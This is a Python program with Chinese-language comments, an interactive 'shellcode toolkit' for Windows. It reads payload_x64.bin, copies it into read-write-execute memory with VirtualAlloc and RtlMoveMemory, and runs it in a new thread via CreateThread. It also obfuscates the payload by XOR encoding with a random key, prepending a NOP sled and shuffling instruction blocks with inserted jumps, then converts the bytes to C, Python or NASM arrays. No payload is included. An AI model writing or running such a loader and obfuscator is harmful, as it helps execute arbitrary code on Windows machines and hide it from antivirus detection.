#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shellcode 工具集 - 主程序
整合所有shellcode处理、混淆和加载功能
"""

import os
import sys
import struct
import random
import time
import ctypes
import argparse

# 定义常量
PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

class ShellcodeLoader:
    """Shellcode加载器"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
    
    def load_and_execute(self, filepath="payload_x64.bin"):
        """加载并执行shellcode"""
        print("=" * 60)
        print("Shellcode 加载器")
        print("=" * 60)
        
        if not os.path.exists(filepath):
            print(f"[-] 错误: 文件 {filepath} 不存在")
            return False
        
        try:
            print(f"[*] 正在加载 {filepath}...")
            with open(filepath, "rb") as f:
                shellcode = f.read()
            
            print(f"[+] 成功加载 {filepath}")
            print(f"[+] Shellcode 大小: {len(shellcode)} 字节")
            
            # 分配可执行内存
            print("[*] 分配可执行内存...")
            ptr = self.kernel32.VirtualAlloc(
                None,
                len(shellcode),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not ptr:
                print("[-] 内存分配失败")
                return False
            
            print(f"[+] 内存已分配: 0x{ptr:x}")
            
            # 复制shellcode到内存
            print("[*] 复制shellcode到内存...")
            buffer = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
            self.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buffer, len(shellcode))
            
            # 提示用户
            print("\n[!] 警告: 即将执行shellcode，确保在安全的环境中运行")
            input("[!] 按Enter键继续...")
            
            # 创建线程执行shellcode
            print("[*] 创建线程执行shellcode...")
            thread_h = self.kernel32.CreateThread(
                None,
                0,
                ctypes.c_void_p(ptr),
                None,
                0,
                ctypes.byref(ctypes.c_ulong(0))
            )
            
            if not thread_h:
                print("[-] 线程创建失败")
                return False
            
            print("[+] 线程已创建，等待执行...")
            
            # 等待线程执行完成
            self.kernel32.WaitForSingleObject(thread_h, 0xFFFFFFFF)
            print("[+] Shellcode执行完成")
            return True
            
        except Exception as e:
            print(f"[-] 发生错误: {e}")
            import traceback
            traceback.print_exc()
            return False

class ShellcodeObfuscator:
    """Shellcode混淆器"""
    
    def __init__(self):
        self.input_file = "payload_x64.bin"
    
    def xor_obfuscate(self):
        """XOR混淆"""
        print("=" * 60)
        print("XOR Shellcode 混淆器")
        print("=" * 60)
        
        if not os.path.exists(self.input_file):
            print(f"[-] 错误: 文件 {self.input_file} 不存在")
            return False
        
        try:
            # 加载shellcode
            with open(self.input_file, "rb") as f:
                shellcode = f.read()
            
            print(f"[+] 原始大小: {len(shellcode)} 字节")
            
            # 生成密钥
            key = random.randint(1, 255)
            print(f"[+] 生成XOR密钥: 0x{key:02X}")
            
            # XOR编码
            encoded = bytes([b ^ key for b in shellcode])
            print(f"[+] XOR编码完成，大小: {len(encoded)} 字节")
            
            # 保存混淆后的shellcode
            with open(self.input_file, "wb") as f:
                f.write(encoded)
            
            print(f"[+] 混淆后的shellcode已保存到: {self.input_file}")
            print(f"[+] XOR密钥: 0x{key:02X}")
            return True
            
        except Exception as e:
            print(f"[-] 混淆失败: {e}")
            return False
    
    def nop_obfuscate(self, sled_size=200):
        """NOP混淆"""
        print("=" * 60)
        print("NOP Shellcode 混淆器")
        print("=" * 60)
        
        if not os.path.exists(self.input_file):
            print(f"[-] 错误: 文件 {self.input_file} 不存在")
            return False
        
        try:
            # 加载shellcode
            with open(self.input_file, "rb") as f:
                shellcode = f.read()
            
            print(f"[+] 原始大小: {len(shellcode)} 字节")
            
            # 添加NOP滑行道
            nop_sled = b'\x90' * sled_size
            obfuscated = nop_sled + shellcode
            
            # 保存混淆后的shellcode
            with open(self.input_file, "wb") as f:
                f.write(obfuscated)
            
            print(f"[+] 插入 {sled_size} 字节 NOP 滑行道")
            print(f"[+] 混淆后大小: {len(obfuscated)} 字节")
            print(f"[+] 混淆后的shellcode已保存到: {self.input_file}")
            return True
            
        except Exception as e:
            print(f"[-] 混淆失败: {e}")
            return False
    
    def instruction_reorder_obfuscate(self):
        """指令重排混淆"""
        print("=" * 60)
        print("指令重排 Shellcode 混淆器")
        print("=" * 60)
        
        if not os.path.exists(self.input_file):
            print(f"[-] 错误: 文件 {self.input_file} 不存在")
            return False
        
        try:
            # 加载shellcode
            print("[*] 正在加载shellcode...")
            with open(self.input_file, "rb") as f:
                shellcode = f.read()
            
            print(f"[+] 原始大小: {len(shellcode)} 字节")
            
            # 分析指令边界
            print("[*] 正在分析指令边界...")
            instructions = self._analyze_instructions(shellcode)
            print(f"[+] 检测到 {len(instructions)} 个指令")
            
            # 重排指令
            print("[*] 正在重排指令...")
            reordered = self._reorder_instructions(instructions)
            print(f"[+] 指令重排完成，共处理 {len(reordered)} 个指令块")
            
            # 生成跳转指令
            print("[*] 正在生成跳转指令...")
            obfuscated = self._generate_jump_instructions(reordered)
            print(f"[+] 混淆后大小: {len(obfuscated)} 字节")
            
            # 直接替换原文件
            print("[*] 正在保存混淆后的shellcode...")
            with open(self.input_file, "wb") as f:
                f.write(obfuscated)
            
            print(f"[+] 混淆后的shellcode已直接替换原文件: {self.input_file}")
            print(f"[+] 修改进度: 100% 完成")
            return True
            
        except Exception as e:
            print(f"[-] 混淆失败: {e}")
            return False
    
    def _analyze_instructions(self, shellcode):
        """分析指令边界"""
        instructions = []
        i = 0
        total_bytes = len(shellcode)
        
        print(f"[*] 开始分析 {total_bytes} 字节的shellcode...")
        
        while i < len(shellcode):
            if i + 1 < len(shellcode):
                opcode = shellcode[i]
                
                # 简化的指令长度检测
                if opcode in [0x90, 0xCC]:  # NOP, INT3
                    length = 1
                elif opcode in [0xEB, 0xE9]:  # JMP short, JMP near
                    length = 2 if opcode == 0xEB else 5
                elif opcode in [0x74, 0x75, 0xE0, 0xE1, 0xE2, 0xE3]:  # 条件跳转
                    length = 2
                elif opcode in [0xC3, 0xC2]:  # RET
                    length = 1 if opcode == 0xC3 else 3
                elif opcode in [0x48, 0x49, 0x4C, 0x4D]:  # REX前缀
                    if i + 1 < len(shellcode):
                        next_byte = shellcode[i + 1]
                        if next_byte in [0x89, 0x8B, 0x8D]:  # MOV指令
                            length = 3
                        else:
                            length = 2
                    else:
                        length = 1
                else:
                    length = 1
                
                if i + length <= len(shellcode):
                    instruction = shellcode[i:i + length]
                    instructions.append((i, instruction))
                    i += length
                else:
                    instruction = shellcode[i:]
                    instructions.append((i, instruction))
                    break
            else:
                instructions.append((i, shellcode[i:i+1]))
                break
            
            # 显示分析进度
            if len(instructions) % 10 == 0:  # 每10个指令显示一次进度
                progress = (i / total_bytes) * 100
                print(f"[*] 分析进度: {progress:.1f}% ({i}/{total_bytes} 字节)")
        
        print(f"[+] 指令分析完成，共识别 {len(instructions)} 个指令")
        return instructions
    
    def _reorder_instructions(self, instructions):
        """重排指令顺序"""
        print(f"[*] 开始重排 {len(instructions)} 个指令...")
        
        blocks = []
        block_size = random.randint(3, 5)
        print(f"[*] 使用块大小: {block_size}")
        
        for i in range(0, len(instructions), block_size):
            block = instructions[i:i + block_size]
            blocks.append(block)
        
        print(f"[*] 创建了 {len(blocks)} 个指令块")
        print("[*] 正在随机重排指令块...")
        
        random.shuffle(blocks)
        
        reordered = []
        for i, block in enumerate(blocks):
            reordered.extend(block)
            # 显示重排进度
            if (i + 1) % 5 == 0 or i == len(blocks) - 1:  # 每5个块显示一次进度
                progress = ((i + 1) / len(blocks)) * 100
                print(f"[*] 重排进度: {progress:.1f}% ({i + 1}/{len(blocks)} 块)")
        
        print(f"[+] 指令重排完成")
        return reordered
    
    def _generate_jump_instructions(self, reordered_instructions):
        """生成跳转指令"""
        print(f"[*] 开始为 {len(reordered_instructions)} 个重排指令生成跳转指令...")
        
        obfuscated_shellcode = b""
        current_offset = 0
        
        # 创建地址映射
        print("[*] 正在创建地址映射...")
        address_mapping = {}
        for i, (orig_addr, instr) in enumerate(reordered_instructions):
            address_mapping[orig_addr] = current_offset
            current_offset += len(instr)
        
        print(f"[+] 地址映射创建完成")
        
        # 生成跳转指令
        print("[*] 正在生成跳转指令...")
        current_offset = 0
        for i, (orig_addr, instr) in enumerate(reordered_instructions):
            if i < len(reordered_instructions) - 1:
                next_orig_addr = reordered_instructions[i + 1][0]
                next_offset = address_mapping[next_orig_addr]
                jump_distance = next_offset - (current_offset + 2)
                
                if -128 <= jump_distance <= 127:
                    jump_instr = bytes([0xEB, jump_distance & 0xFF])
                else:
                    jump_instr = bytes([0xE9]) + struct.pack('<i', jump_distance)
                
                instr_with_jump = instr + jump_instr
            else:
                instr_with_jump = instr
            
            obfuscated_shellcode += instr_with_jump
            current_offset += len(instr_with_jump)
            
            # 显示生成进度
            if (i + 1) % 20 == 0 or i == len(reordered_instructions) - 1:  # 每20个指令显示一次进度
                progress = ((i + 1) / len(reordered_instructions)) * 100
                print(f"[*] 跳转指令生成进度: {progress:.1f}% ({i + 1}/{len(reordered_instructions)} 指令)")
        
        print(f"[+] 跳转指令生成完成，最终大小: {len(obfuscated_shellcode)} 字节")
        return obfuscated_shellcode

class ShellcodeConverter:
    """Shellcode格式转换器"""
    
    def __init__(self):
        self.input_file = "payload_x64.bin"
    
    def convert_to_format(self, output_format='c', output_file=None, bytes_per_line=16):
        """转换为指定格式"""
        print("=" * 60)
        print("Shellcode 格式转换器")
        print("=" * 60)
        
        if not os.path.exists(self.input_file):
            print(f"[-] 错误: 文件 {self.input_file} 不存在")
            return False
        
        try:
            with open(self.input_file, 'rb') as f:
                binary_data = f.read()
            
            print(f"[+] 文件大小: {len(binary_data)} 字节")
            
            # 转换为16进制字符串
            hex_bytes = [f"\\x{byte:02x}" for byte in binary_data]
            
            shellcode_lines = []
            
            if output_format.lower() == 'c':
                shellcode_lines.append("unsigned char shellcode[] = {")
                for i in range(0, len(binary_data), bytes_per_line):
                    line_bytes = binary_data[i:i+bytes_per_line]
                    hex_line = ", ".join(f"0x{byte:02x}" for byte in line_bytes)
                    if i + bytes_per_line < len(binary_data):
                        hex_line += ","
                    shellcode_lines.append(f"    {hex_line}")
                shellcode_lines.append("};")
                shellcode_lines.append(f"unsigned int shellcode_len = {len(binary_data)};")
                
            elif output_format.lower() == 'python':
                shellcode_lines.append("shellcode = (")
                for i in range(0, len(hex_bytes), bytes_per_line):
                    line_bytes = hex_bytes[i:i+bytes_per_line]
                    hex_line = "".join(line_bytes)
                    shellcode_lines.append(f'    "{hex_line}"')
                shellcode_lines.append(")")
                shellcode_lines.append(f"# 长度: {len(binary_data)} 字节")
                
            elif output_format.lower() == 'nasm':
                shellcode_lines.append("shellcode:")
                for i in range(0, len(binary_data), bytes_per_line):
                    line_bytes = binary_data[i:i+bytes_per_line]
                    hex_line = ", ".join(f"0x{byte:02x}" for byte in line_bytes)
                    shellcode_lines.append(f"    db {hex_line}")
                shellcode_lines.append(f"; 长度: {len(binary_data)} 字节")
                
            elif output_format.lower() == 'raw':
                for i in range(0, len(hex_bytes), bytes_per_line):
                    line_bytes = hex_bytes[i:i+bytes_per_line]
                    hex_line = "".join(line_bytes)
                    shellcode_lines.append(hex_line)
            
            result = "\n".join(shellcode_lines)
            
            # 输出结果
            if output_file:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(result)
                print(f"[+] 转换结果已保存到: {output_file}")
            else:
                print("\n转换结果:")
                print(result)
            
            return True
            
        except Exception as e:
            print(f"[-] 转换失败: {e}")
            return False

def print_banner():
    """打印程序横幅"""
    print("=" * 60)
    print("Shellcode 工具集 - 主程序")
    print("整合所有shellcode处理、混淆和加载功能")
    print("=" * 60)

def print_menu():
    """打印主菜单"""
    print("\n请选择功能:")
    print("1. 加载并执行shellcode")
    print("2. XOR混淆")
    print("3. NOP混淆")
    print("4. 指令重排混淆")
    print("5. 格式转换")
    print("6. 查看文件信息")
    print("0. 退出")
    print("-" * 60)

def get_file_info():
    """获取文件信息"""
    print("=" * 60)
    print("文件信息")
    print("=" * 60)
    
    files = [
        "payload_x64.bin"
    ]
    
    for file in files:
        if os.path.exists(file):
            size = os.path.getsize(file)
            print(f"[+] {file}: {size} 字节")
        else:
            print(f"[-] {file}: 不存在")

def main():
    """主函数"""
    print_banner()
    
    loader = ShellcodeLoader()
    obfuscator = ShellcodeObfuscator()
    converter = ShellcodeConverter()
    
    while True:
        print_menu()
        try:
            choice = input("请输入选项 (0-6): ").strip()
            
            if choice == '0':
                print("再见!")
                break
            elif choice == '1':
                loader.load_and_execute()
            elif choice == '2':
                obfuscator.xor_obfuscate()
            elif choice == '3':
                sled_size = input("请输入NOP滑行道大小 (默认200): ").strip()
                if not sled_size:
                    sled_size = 200
                else:
                    sled_size = int(sled_size)
                obfuscator.nop_obfuscate(sled_size)
            elif choice == '4':
                obfuscator.instruction_reorder_obfuscate()
            elif choice == '5':
                print("\n格式转换选项:")
                print("1. C语言格式")
                print("2. Python格式")
                print("3. NASM汇编格式")
                print("4. 原始16进制格式")
                format_choice = input("请选择格式 (1-4): ").strip()
                
                formats = { '1': 'c', '2': 'python', '3': 'nasm', '4': 'raw' }
                if format_choice in formats:
                    output_file = input("输出文件名 (可选，直接回车输出到控制台): ").strip()
                    if not output_file:
                        output_file = None
                    converter.convert_to_format(formats[format_choice], output_file)
                else:
                    print("[-] 无效选项")
            elif choice == '6':
                get_file_info()
            else:
                print("[-] 无效选项，请重新选择")
                
        except KeyboardInterrupt:
            print("\n\n再见!")
            break
        except Exception as e:
            print(f"[-] 发生错误: {e}")
        
        input("\n按Enter键继续...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n程序被用户中断")
    except Exception as e:
        print(f"\n程序发生错误: {e}")
        import traceback
        traceback.print_exc()